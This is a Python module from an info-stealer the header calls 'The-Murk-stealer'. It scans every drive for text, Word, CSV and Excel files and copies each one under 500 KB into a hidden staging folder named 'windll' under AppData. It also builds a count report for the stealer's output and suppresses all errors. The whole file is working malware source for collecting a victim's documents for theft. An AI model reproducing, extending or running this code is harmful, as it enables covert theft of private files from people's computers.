#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
from os import environ,sep,chdir,makedirs
import psutil
from pathlib import Path
from os.path import getsize
from shutil import copy2


def Copy(fileList, path, extension, count):
    extension = extension[4:]
    for i in range (len(fileList)):
        count+=1
        try:
            num = fileList[i].rfind("\\")
            fname = fileList[i][num+1:]
            print(fileList[i])
            size = getsize(fileList[i])
            try:
                 makedirs(rf'{path}\windll\Files\File-Grabber\{extension[1:]}')
            except:
                 pass
            if size < 500000:
                copy2(fileList[i],rf'{path}\windll\Files\File-Grabber\{extension[1:]}\{fname[:-len(extension)]}___{count}{extension}')
        except:
            pass
    return count

def Grab(data):
    chdir("C:")
    try:
        mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
        try:
            makedirs(rf'{mainPath}\windll\Files\File-Grabber')
        except:
            pass
        try:
            print("fg on")
            data.append("\n\n**📁File-grabber📁**")

            filesGrab = [
                ["**\*.txt", 0],
                ["**\*.docx", 0],
                ["**\*.csv", 0],
                ["**\*.xls", 0],
            ]

            drives = psutil.disk_partitions()
            for drive in drives:
                    for i in range(len(filesGrab)):
                        try:
                            pathes = list(str(_) for _ in Path(drive.device).glob(filesGrab[i][0]))
                        except:
                            pass
                        try:
                            filesGrab[i][1]= Copy(pathes,mainPath,filesGrab[i][0],filesGrab[i][1])
                        except:
                           pass
            for i in range(len(filesGrab)):
                data.append(f"\n∟📄files{filesGrab[i][0][4:]}: {filesGrab[i][1]}")
            return data
        except:
            return data
    except:
            return data